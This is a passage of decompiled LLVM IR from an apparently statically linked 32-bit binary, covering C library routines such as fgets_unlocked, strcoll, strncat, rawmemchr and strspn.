  store i32 %v0_8056d7a, i32* @esi, align 4
  store i32 %v0_8056d79, i32* @edi, align 4
  store i32 %v0_8056d78, i32* @ebp, align 4
  ret i32 %v0_8056eb2

; uselistorder directives
  uselistorder i32 %v3_8056e7b, { 1, 2, 0 }
  uselistorder i32 %v2_8056da7, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805d208.489 to i32*), { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805d20c.487 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_80614a4.594, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 (i32)* @__pthread_return_0, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 3, 29, 31, 30, 28, 2, 1, 0, 6, 5, 7, 8, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805d224.488 to i32), { 1, 3, 4, 5, 9, 2, 6, 0, 7, 8 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 51, 50, 55, 54, 53, 52, 49, 48, 5, 4, 3, 2, 7, 6, 9, 8 }
  uselistorder i32 134564459, { 18, 19, 2, 3, 4, 5, 20, 21, 6, 22, 23, 7, 8, 25, 26, 27, 28, 29, 30, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 24, 17 }
  uselistorder i16* %arg1, { 1, 2, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8056eaf, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056e7b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056e61, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056e33, { 1, 0 }
  uselistorder label %dec_label_pc_8056e06, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8056ebc = load i32, i32* @ebp, align 4
  %v4_8056ec3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056ec3, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8056ec3, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8056f0d.preheader, label %dec_label_pc_8056f19

dec_label_pc_8056f0d.preheader:                   ; preds = %entry
  %v1_8056f0d19 = add i32 %arg2, -1
  %v8_8056f0d20 = icmp eq i32 %v1_8056f0d19, 0
  store i32 %v1_8056f0d19, i32* @esi, align 4
  %v1_8056f0e21 = icmp eq i1 %v8_8056f0d20, false
  br i1 %v1_8056f0e21, label %dec_label_pc_8056ed7, label %dec_label_pc_8056f10

dec_label_pc_8056ed7:                             ; preds = %dec_label_pc_8056f0d.preheader, %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge.dec_label_pc_8056ed7_crit_edge
  %v0_8056ed7 = phi i32 [ %v0_8056ed7.pre, %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge.dec_label_pc_8056ed7_crit_edge ], [ %arg3, %dec_label_pc_8056f0d.preheader ]
  %v1_8056ed7 = add i32 %v0_8056ed7, 16
  %v2_8056ed7 = inttoptr i32 %v1_8056ed7 to i32*
  %v3_8056ed7 = load i32, i32* %v2_8056ed7, align 4
  store i32 %v3_8056ed7, i32* %eax.global-to-local, align 4
  %v2_8056eda = add i32 %v0_8056ed7, 24
  %v3_8056eda = inttoptr i32 %v2_8056eda to i32*
  %v4_8056eda = load i32, i32* %v3_8056eda, align 4
  %v10_8056eda = icmp ult i32 %v3_8056ed7, %v4_8056eda
  %v1_8056edd = icmp eq i1 %v10_8056eda, false
  br i1 %v1_8056edd, label %dec_label_pc_8056eed, label %dec_label_pc_8056edf

dec_label_pc_8056edf:                             ; preds = %dec_label_pc_8056ed7
  %v1_8056edf = inttoptr i32 %v3_8056ed7 to i8*
  %v2_8056edf = load i8, i8* %v1_8056edf, align 1
  %v3_8056edf = zext i8 %v2_8056edf to i32
  %v4_8056edf = load i32, i32* @edx, align 4
  %v5_8056edf = and i32 %v4_8056edf, -256
  %v6_8056edf = or i32 %v5_8056edf, %v3_8056edf
  store i32 %v6_8056edf, i32* @edx, align 4
  %v1_8056ee1 = add i32 %v3_8056ed7, 1
  store i32 %v1_8056ee1, i32* %eax.global-to-local, align 4
  %v2_8056ee2 = load i32, i32* @ebx, align 4
  %v3_8056ee2 = inttoptr i32 %v2_8056ee2 to i8*
  store i8 %v2_8056edf, i8* %v3_8056ee2, align 1
  %v0_8056ee4 = load i32, i32* @ebx, align 4
  %v1_8056ee4 = add i32 %v0_8056ee4, 1
  store i32 %v1_8056ee4, i32* @ebx, align 4
  %v0_8056ee5 = load i32, i32* @edx, align 4
  %v1_8056ee5 = trunc i32 %v0_8056ee5 to i8
  %v10_8056ee5 = icmp eq i8 %v1_8056ee5, 10
  %v0_8056ee8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056ee8 = load i32, i32* @ebp, align 4
  %v2_8056ee8 = add i32 %v1_8056ee8, 16
  %v3_8056ee8 = inttoptr i32 %v2_8056ee8 to i32*
  store i32 %v0_8056ee8, i32* %v3_8056ee8, align 4
  br i1 %v10_8056ee5, label %dec_label_pc_8056f10, label %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge

dec_label_pc_8056eed:                             ; preds = %dec_label_pc_8056ed7
  %v0_8056ef1 = call i32 @getc_unlocked()
  %v1_8056ef1 = trunc i32 %v0_8056ef1 to i8
  store i32 %v0_8056ef1, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_8056ef1, 256
  %v11_8056ef9 = icmp eq i32 %sext.mask, 255
  %v1_8056efc = icmp eq i1 %v11_8056ef9, false
  br i1 %v1_8056efc, label %dec_label_pc_8056f0b, label %dec_label_pc_8056efe

dec_label_pc_8056efe:                             ; preds = %dec_label_pc_8056eed
  %v0_8056efe = load i32, i32* @ebp, align 4
  %v1_8056efe = inttoptr i32 %v0_8056efe to i8*
  %v2_8056efe = load i8, i8* %v1_8056efe, align 1
  %v3_8056efe = and i8 %v2_8056efe, 8
  %v4_8056efe = icmp eq i8 %v3_8056efe, 0
  br i1 %v4_8056efe, label %dec_label_pc_8056f10, label %dec_label_pc_8056f19

dec_label_pc_8056f0b:                             ; preds = %dec_label_pc_8056eed
  %v3_8056f06 = load i32, i32* @ebx, align 4
  %v4_8056f06 = inttoptr i32 %v3_8056f06 to i8*
  store i8 %v1_8056ef1, i8* %v4_8056f06, align 1
  %v0_8056f08 = load i32, i32* @ebx, align 4
  %v1_8056f08 = add i32 %v0_8056f08, 1
  store i32 %v1_8056f08, i32* @ebx, align 4
  %v11_8056f09 = icmp eq i8 %v1_8056ef1, 10
  br i1 %v11_8056f09, label %dec_label_pc_8056f10, label %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge

dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge: ; preds = %dec_label_pc_8056edf, %dec_label_pc_8056f0b
  %v0_8056f0d.pre = load i32, i32* @esi, align 4
  %v1_8056f0d = add i32 %v0_8056f0d.pre, -1
  %v8_8056f0d = icmp eq i32 %v1_8056f0d, 0
  store i32 %v1_8056f0d, i32* @esi, align 4
  %v1_8056f0e = icmp eq i1 %v8_8056f0d, false
  br i1 %v1_8056f0e, label %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge.dec_label_pc_8056ed7_crit_edge, label %dec_label_pc_8056f10

dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge.dec_label_pc_8056ed7_crit_edge: ; preds = %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge
  %v0_8056ed7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8056ed7

dec_label_pc_8056f10:                             ; preds = %dec_label_pc_8056f0d.preheader, %dec_label_pc_8056edf, %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge, %dec_label_pc_8056f0b, %dec_label_pc_8056efe
  %v0_8056f10 = load i32, i32* @ebx, align 4
  %v1_8056f10 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8056f10, %v1_8056f10
  br i1 %tmp23, label %dec_label_pc_8056f14, label %dec_label_pc_8056f19

dec_label_pc_8056f14:                             ; preds = %dec_label_pc_8056f10
  %v1_8056f14 = inttoptr i32 %v0_8056f10 to i8*
  store i8 0, i8* %v1_8056f14, align 1
  %v0_8056f1e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056f1b

dec_label_pc_8056f19:                             ; preds = %dec_label_pc_8056f10, %dec_label_pc_8056efe, %entry
  br label %dec_label_pc_8056f1b

dec_label_pc_8056f1b:                             ; preds = %dec_label_pc_8056f14, %dec_label_pc_8056f19
  %v0_8056f1e = phi i32 [ %v0_8056f1e.pre, %dec_label_pc_8056f14 ], [ 0, %dec_label_pc_8056f19 ]
  store i32 %v0_8056f1e, i32* %eax.global-to-local, align 4
  store i32 %v0_8056ebc, i32* @ebp, align 4
  ret i32 %v0_8056f1e

; uselistorder directives
  uselistorder i32 %v0_8056f1e, { 1, 0 }
  uselistorder i32 %v0_8056f10, { 1, 0 }
  uselistorder i32 %v1_8056f0d, { 1, 0 }
  uselistorder i32 %v0_8056ef1, { 0, 2, 1 }
  uselistorder i32 %v0_8056ed7, { 1, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 14, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder label %dec_label_pc_8056f1b, { 1, 0 }
  uselistorder label %dec_label_pc_8056f10, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8056f0b.dec_label_pc_8056f0d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8056ed7, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8056f2a = ptrtoint i8* %arg1 to i32
  %v4_8056f32.pre = load i32, i32* @eax, align 4
  %v8_8056f32.pre = load i1, i1* @df, align 1
  %v9_8056f32 = select i1 %v8_8056f32.pre, i32 -1, i32 1
  br label %dec_label_pc_8056f32

dec_label_pc_8056f32:                             ; preds = %dec_label_pc_8056f36, %entry
  %v20_8056f33 = phi i32 [ %v23_8056f33, %dec_label_pc_8056f36 ], [ %arg2, %entry ]
  %v4_8056f32 = phi i32 [ %v6_8056f32, %dec_label_pc_8056f36 ], [ %v4_8056f32.pre, %entry ]
  %v7_8056f32 = phi i32 [ %v10_8056f32, %dec_label_pc_8056f36 ], [ %v4_8056f2a, %entry ]
  %v1_8056f32 = inttoptr i32 %v7_8056f32 to i8*
  %v2_8056f32 = load i8, i8* %v1_8056f32, align 1
  %v3_8056f33 = inttoptr i32 %v20_8056f33 to i8*
  %v4_8056f33 = load i8, i8* %v3_8056f33, align 1
  %v15_8056f33 = icmp eq i8 %v2_8056f32, %v4_8056f33
  %v1_8056f34 = icmp eq i1 %v15_8056f33, false
  br i1 %v1_8056f34, label %dec_label_pc_8056f3e, label %dec_label_pc_8056f36

dec_label_pc_8056f36:                             ; preds = %dec_label_pc_8056f32
  %v3_8056f32 = zext i8 %v2_8056f32 to i32
  %v5_8056f32 = and i32 %v4_8056f32, -256
  %v6_8056f32 = or i32 %v3_8056f32, %v5_8056f32
  %v23_8056f33 = add i32 %v20_8056f33, %v9_8056f32
  %v10_8056f32 = add i32 %v7_8056f32, %v9_8056f32
  %v4_8056f36 = icmp eq i8 %v2_8056f32, 0
  %v1_8056f38 = icmp eq i1 %v4_8056f36, false
  br i1 %v1_8056f38, label %dec_label_pc_8056f32, label %dec_label_pc_8056f42

dec_label_pc_8056f3e:                             ; preds = %dec_label_pc_8056f32
  br label %dec_label_pc_8056f42

dec_label_pc_8056f42:                             ; preds = %dec_label_pc_8056f36, %dec_label_pc_8056f3e
  %storemerge = phi i32 [ 1, %dec_label_pc_8056f3e ], [ 0, %dec_label_pc_8056f36 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8056f32, { 1, 2, 0 }
  uselistorder i32 %v9_8056f32, { 1, 0 }
  uselistorder label %dec_label_pc_8056f42, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8056f49 = load i32, i32* @esi, align 4
  store i32 %v0_8056f49, i32* %stack_var_-8, align 4
  %v4_8056f4a = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8056f4a, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8056f57 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8056f5b = call i32 @_strlen(i8* %v4_8056f57)
  %v2_8056f5d = add i32 %tmp, -1
  store i32 %v2_8056f5d, i32* %edi.global-to-local, align 4
  %v0_8056f5e = load i32, i32* %edx.global-to-local, align 4
  %v8_8056f6110 = icmp eq i32 %v0_8056f5e, 0
  store i32 %v0_8056f5e, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056f6110, label %dec_label_pc_8056f6c, label %dec_label_pc_8056f64.lr.ph

dec_label_pc_8056f64.lr.ph:                       ; preds = %entry
  %v4_8056f64.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8056f64.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8056f64

dec_label_pc_8056f64:                             ; preds = %dec_label_pc_8056f64.lr.ph, %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge
  %v8_8056f64 = phi i1 [ %v8_8056f64.pre, %dec_label_pc_8056f64.lr.ph ], [ %v5_8056f65, %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge ]
  %v4_8056f64 = phi i32 [ %v4_8056f64.pre, %dec_label_pc_8056f64.lr.ph ], [ %v0_8056f66, %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge ]
  %v2_8056f6e11 = phi i32 [ %v2_8056f5d, %dec_label_pc_8056f64.lr.ph ], [ %v7_8056f65, %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge ]
  %v0_8056f64 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056f64 = inttoptr i32 %v0_8056f64 to i8*
  %v2_8056f64 = load i8, i8* %v1_8056f64, align 1
  %v3_8056f64 = zext i8 %v2_8056f64 to i32
  %v5_8056f64 = and i32 %v4_8056f64, -256
  %v6_8056f64 = or i32 %v5_8056f64, %v3_8056f64
  store i32 %v6_8056f64, i32* %eax.global-to-local, align 4
  %v9_8056f64 = select i1 %v8_8056f64, i32 -1, i32 1
  %v10_8056f64 = add i32 %v9_8056f64, %v0_8056f64
  store i32 %v10_8056f64, i32* %esi.global-to-local, align 4
  %v3_8056f65 = inttoptr i32 %v2_8056f6e11 to i8*
  store i8 %v2_8056f64, i8* %v3_8056f65, align 1
  %v4_8056f65 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056f65 = load i1, i1* @df, align 1
  %v6_8056f65 = select i1 %v5_8056f65, i32 -1, i32 1
  %v7_8056f65 = add i32 %v6_8056f65, %v4_8056f65
  store i32 %v7_8056f65, i32* %edi.global-to-local, align 4
  %v0_8056f66 = load i32, i32* %eax.global-to-local, align 4
  %v3_8056f66 = trunc i32 %v0_8056f66 to i8
  %v4_8056f66 = icmp eq i8 %v3_8056f66, 0
  %v1_8056f68 = icmp eq i1 %v4_8056f66, false
  br i1 %v1_8056f68, label %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge, label %dec_label_pc_8056f6f

dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge: ; preds = %dec_label_pc_8056f64
  %v0_8056f61.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056f61 = add i32 %v0_8056f61.pre, -1
  %v8_8056f61 = icmp eq i32 %v1_8056f61, 0
  store i32 %v1_8056f61, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056f61, label %dec_label_pc_8056f6c, label %dec_label_pc_8056f64

dec_label_pc_8056f6c:                             ; preds = %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge, %entry
  %v2_8056f6e.lcssa = phi i32 [ %v2_8056f5d, %entry ], [ %v7_8056f65, %dec_label_pc_8056f64.dec_label_pc_8056f61_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8056f6e = inttoptr i32 %v2_8056f6e.lcssa to i8*
  store i8 0, i8* %v3_8056f6e, align 1
  %v4_8056f6e = load i32, i32* %edi.global-to-local, align 4
  %v5_8056f6e = load i1, i1* @df, align 1
  %v6_8056f6e = select i1 %v5_8056f6e, i32 -1, i32 1
  %v7_8056f6e = add i32 %v6_8056f6e, %v4_8056f6e
  store i32 %v7_8056f6e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056f6f

dec_label_pc_8056f6f:                             ; preds = %dec_label_pc_8056f64, %dec_label_pc_8056f6c
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8056f73 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056f73, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8056f61, { 1, 0 }
  uselistorder i32 %v0_8056f66, { 1, 0 }
  uselistorder i32 %v7_8056f65, { 0, 2, 1 }
  uselistorder i1 %v5_8056f65, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8056f6f, { 1, 0 }
  uselistorder label %dec_label_pc_8056f64, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8056f79 = load i32, i32* @ebx, align 4
  %v4_8056f7a = urem i32 %arg2, 256
  %v4_8056f7e = ptrtoint i8* %arg1 to i32
  %v2_8056f893 = urem i32 %v4_8056f7e, 4
  %v3_8056f894 = icmp eq i32 %v2_8056f893, 0
  %v1_8056f8b8 = icmp eq i1 %v3_8056f894, false
  %v4_8056f84 = trunc i32 %arg2 to i8
  br i1 %v1_8056f8b8, label %dec_label_pc_8056f84, label %dec_label_pc_8056f8d

dec_label_pc_8056f84:                             ; preds = %entry, %dec_label_pc_8056f88
  %v0_8056f88 = phi i32 [ %v1_8056f88, %dec_label_pc_8056f88 ], [ %v4_8056f7e, %entry ]
  %v1_8056f84 = inttoptr i32 %v0_8056f88 to i8*
  %v2_8056f84 = load i8, i8* %v1_8056f84, align 1
  %v15_8056f84 = icmp eq i8 %v2_8056f84, %v4_8056f84
  br i1 %v15_8056f84, label %dec_label_pc_8056fd8, label %dec_label_pc_8056f88

dec_label_pc_8056f88:                             ; preds = %dec_label_pc_8056f84
  %v1_8056f88 = add i32 %v0_8056f88, 1
  %v2_8056f89 = urem i32 %v1_8056f88, 4
  %v3_8056f89 = icmp eq i32 %v2_8056f89, 0
  %v1_8056f8b = icmp eq i1 %v3_8056f89, false
  br i1 %v1_8056f8b, label %dec_label_pc_8056f84, label %dec_label_pc_8056f8d

dec_label_pc_8056f8d:                             ; preds = %entry, %dec_label_pc_8056f88
  %v0_8056f90 = phi i32 [ %v1_8056f88, %dec_label_pc_8056f88 ], [ %v4_8056f7e, %entry ]
  %v2_8056f94 = mul nuw nsw i32 %v4_8056f7a, 256
  %v2_8056f97 = or i32 %v2_8056f94, %v4_8056f7a
  %v2_8056f9b = mul i32 %v2_8056f97, 65536
  %v2_8056f9e = or i32 %v2_8056f9b, %v2_8056f97
  br label %dec_label_pc_8056fa0

dec_label_pc_8056fa0:                             ; preds = %dec_label_pc_8056fd0, %dec_label_pc_8056fa0, %dec_label_pc_8056f8d
  %v0_8056fa4 = phi i32 [ %v0_8056f90, %dec_label_pc_8056f8d ], [ %v1_8056fa4, %dec_label_pc_8056fa0 ], [ %v1_8056fa4, %dec_label_pc_8056fd0 ]
  %v2_8056fa2 = inttoptr i32 %v0_8056fa4 to i32*
  %v3_8056fa2 = load i32, i32* %v2_8056fa2, align 4
  %v4_8056fa2 = xor i32 %v3_8056fa2, %v2_8056f9e
  %v1_8056fa4 = add i32 %v0_8056fa4, 4
  store i32 %v1_8056fa4, i32* @ecx, align 4
  %v1_8056fa7 = add i32 %v4_8056fa2, 2130640639
  %v1_8056fad = sub i32 -1, %v4_8056fa2
  store i32 %v1_8056fad, i32* @edx, align 4
  %v2_8056faf = xor i32 %v1_8056fa7, %v1_8056fad
  %v1_8056fb1 = and i32 %v2_8056faf, -2130640640
  %v2_8056fb1 = icmp eq i32 %v1_8056fb1, 0
  br i1 %v2_8056fb1, label %dec_label_pc_8056fa0, label %dec_label_pc_8056fb8

dec_label_pc_8056fb8:                             ; preds = %dec_label_pc_8056fa0
  %v2_8056fbb = inttoptr i32 %v0_8056fa4 to i8*
  %v3_8056fbb = load i8, i8* %v2_8056fbb, align 1
  %v16_8056fbb = icmp eq i8 %v3_8056fbb, %v4_8056f84
  br i1 %v16_8056fbb, label %dec_label_pc_8056fd8, label %dec_label_pc_8056fc0

dec_label_pc_8056fc0:                             ; preds = %dec_label_pc_8056fb8
  %v1_8056fc0 = add i32 %v0_8056fa4, 1
  %v2_8056fc3 = inttoptr i32 %v1_8056fc0 to i8*
  %v3_8056fc3 = load i8, i8* %v2_8056fc3, align 1
  %v16_8056fc3 = icmp eq i8 %v3_8056fc3, %v4_8056f84
  br i1 %v16_8056fc3, label %dec_label_pc_8056fd8, label %dec_label_pc_8056fc8

dec_label_pc_8056fc8:                             ; preds = %dec_label_pc_8056fc0
  %v1_8056fc8 = add i32 %v0_8056fa4, 2
  %v2_8056fcb = inttoptr i32 %v1_8056fc8 to i8*
  %v3_8056fcb = load i8, i8* %v2_8056fcb, align 1
  %v16_8056fcb = icmp eq i8 %v3_8056fcb, %v4_8056f84
  br i1 %v16_8056fcb, label %dec_label_pc_8056fd8, label %dec_label_pc_8056fd0

dec_label_pc_8056fd0:                             ; preds = %dec_label_pc_8056fc8
  %v1_8056fd0 = add i32 %v0_8056fa4, 3
  %v2_8056fd3 = inttoptr i32 %v1_8056fd0 to i8*
  %v3_8056fd3 = load i8, i8* %v2_8056fd3, align 1
  %v16_8056fd3 = icmp eq i8 %v3_8056fd3, %v4_8056f84
  %v1_8056fd6 = icmp eq i1 %v16_8056fd3, false
  br i1 %v1_8056fd6, label %dec_label_pc_8056fa0, label %dec_label_pc_8056fd8

dec_label_pc_8056fd8:                             ; preds = %dec_label_pc_8056f84, %dec_label_pc_8056fd0, %dec_label_pc_8056fc8, %dec_label_pc_8056fc0, %dec_label_pc_8056fb8
  %v0_8056fda = phi i32 [ %v1_8056fd0, %dec_label_pc_8056fd0 ], [ %v1_8056fc8, %dec_label_pc_8056fc8 ], [ %v1_8056fc0, %dec_label_pc_8056fc0 ], [ %v0_8056fa4, %dec_label_pc_8056fb8 ], [ %v0_8056f88, %dec_label_pc_8056f84 ]
  store i32 %v0_8056f79, i32* @ebx, align 4
  ret i32 %v0_8056fda

; uselistorder directives
  uselistorder i32 %v1_8056fad, { 1, 0 }
  uselistorder i32 %v1_8056fa4, { 2, 1, 0 }
  uselistorder i32 %v2_8056f97, { 1, 0 }
  uselistorder i32 %v1_8056f88, { 1, 0, 2 }
  uselistorder i32 %v4_8056f7e, { 2, 1, 0 }
  uselistorder i32 %v4_8056f7a, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056fd8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056f8d, { 1, 0 }
  uselistorder label %dec_label_pc_8056f84, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8056ffe30 = load i8, i8* %arg1, align 1
  %v4_805700034 = icmp eq i8 %v2_8056ffe30, 0
  br i1 %v4_805700034, label %dec_label_pc_8057008, label %dec_label_pc_8057004.lr.ph

dec_label_pc_8057004.lr.ph:                       ; preds = %entry
  %v3_8056ffe31 = zext i8 %v2_8056ffe30 to i32
  %v4_8056ffe.pre = load i32, i32* @eax, align 4
  %v5_8056ffe32 = and i32 %v4_8056ffe.pre, -256
  %v6_8056ffe33 = or i32 %v3_8056ffe31, %v5_8056ffe32
  %v4_8056fe5 = ptrtoint i8* %arg1 to i32
  %v1_8056ff018 = inttoptr i32 %arg2 to i8*
  %v4_8056ff0.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057004

dec_label_pc_8056feb:                             ; preds = %dec_label_pc_8057004, %dec_label_pc_8056fef
  %v6_8056ff027 = phi i32 [ %v6_8056ff0, %dec_label_pc_8056fef ], [ %v6_8056ff022, %dec_label_pc_8057004 ]
  %v2_8056ff026 = phi i8 [ %v2_8056ff0, %dec_label_pc_8056fef ], [ %v2_8056ff019, %dec_label_pc_8057004 ]
  %v0_8056fef25 = phi i32 [ %v1_8056fef, %dec_label_pc_8056fef ], [ %arg2, %dec_label_pc_8057004 ]
  %v15_8056feb = icmp eq i8 %v2_8056ffe37, %v2_8056ff026
  br i1 %v15_8056feb, label %dec_label_pc_8056ff8, label %dec_label_pc_8056fef

dec_label_pc_8056fef:                             ; preds = %dec_label_pc_8056feb
  %v1_8056fef = add i32 %v0_8056fef25, 1
  store i32 %v1_8056fef, i32* @edx, align 4
  %v1_8056ff0 = inttoptr i32 %v1_8056fef to i8*
  %v2_8056ff0 = load i8, i8* %v1_8056ff0, align 1
  %v3_8056ff0 = zext i8 %v2_8056ff0 to i32
  %v5_8056ff0 = and i32 %v6_8056ff027, -256
  %v6_8056ff0 = or i32 %v3_8056ff0, %v5_8056ff0
  store i32 %v6_8056ff0, i32* @ecx, align 4
  %v4_8056ff2 = icmp eq i8 %v2_8056ff0, 0
  %v1_8056ff4 = icmp eq i1 %v4_8056ff2, false
  br i1 %v1_8056ff4, label %dec_label_pc_8056feb, label %dec_label_pc_8057008

dec_label_pc_8056ff8:                             ; preds = %dec_label_pc_8056feb
  %v1_8056ffc = add i32 %v0_805700835, 1
  %v1_8056ffd = add i32 %v0_8056ffd36, 1
  %v1_8056ffe = inttoptr i32 %v1_8056ffd to i8*
  %v2_8056ffe = load i8, i8* %v1_8056ffe, align 1
  %v3_8056ffe = zext i8 %v2_8056ffe to i32
  %v5_8056ffe = and i32 %v6_8056ffe38, -256
  %v6_8056ffe = or i32 %v3_8056ffe, %v5_8056ffe
  %v4_8057000 = icmp eq i8 %v2_8056ffe, 0
  br i1 %v4_8057000, label %dec_label_pc_8057008, label %dec_label_pc_8057004

dec_label_pc_8057004:                             ; preds = %dec_label_pc_8057004.lr.ph, %dec_label_pc_8056ff8
  %v4_8056ff0.pre = phi i32 [ %v4_8056ff0.pre.pre, %dec_label_pc_8057004.lr.ph ], [ %v6_8056ff027, %dec_label_pc_8056ff8 ]
  %v6_8056ffe38 = phi i32 [ %v6_8056ffe33, %dec_label_pc_8057004.lr.ph ], [ %v6_8056ffe, %dec_label_pc_8056ff8 ]
  %v2_8056ffe37 = phi i8 [ %v2_8056ffe30, %dec_label_pc_8057004.lr.ph ], [ %v2_8056ffe, %dec_label_pc_8056ff8 ]
  %v0_8056ffd36 = phi i32 [ %v4_8056fe5, %dec_label_pc_8057004.lr.ph ], [ %v1_8056ffd, %dec_label_pc_8056ff8 ]
  %v0_805700835 = phi i32 [ 0, %dec_label_pc_8057004.lr.ph ], [ %v1_8056ffc, %dec_label_pc_8056ff8 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8056ff019 = load i8, i8* %v1_8056ff018, align 1
  %v3_8056ff020 = zext i8 %v2_8056ff019 to i32
  %v5_8056ff021 = and i32 %v4_8056ff0.pre, -256
  %v6_8056ff022 = or i32 %v3_8056ff020, %v5_8056ff021
  store i32 %v6_8056ff022, i32* @ecx, align 4
  %v4_8056ff223 = icmp eq i8 %v2_8056ff019, 0
  %v1_8056ff424 = icmp eq i1 %v4_8056ff223, false
  br i1 %v1_8056ff424, label %dec_label_pc_8056feb, label %dec_label_pc_8057008

dec_label_pc_8057008:                             ; preds = %entry, %dec_label_pc_8056ff8, %dec_label_pc_8057004, %dec_label_pc_8056fef
  %v0_805700817 = phi i32 [ %v0_805700835, %dec_label_pc_8056fef ], [ %v0_805700835, %dec_label_pc_8057004 ], [ 0, %entry ], [ %v1_8056ffc, %dec_label_pc_8056ff8 ]
  ret i32 %v0_805700817

; uselistorder directives
  uselistorder i32 %v6_8056ff022, { 1, 0 }
  uselistorder i8 %v2_8056ff019, { 1, 2, 0 }
  uselistorder i32 %v1_8056ffd, { 1, 0 }
  uselistorder i32 %v6_8056ff0, { 1, 0 }
  uselistorder i8 %v2_8056ff0, { 1, 2, 0 }
  uselistorder i32 %v1_8056fef, { 2, 1, 0 }
  uselistorder i8 %v2_8056ffe30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
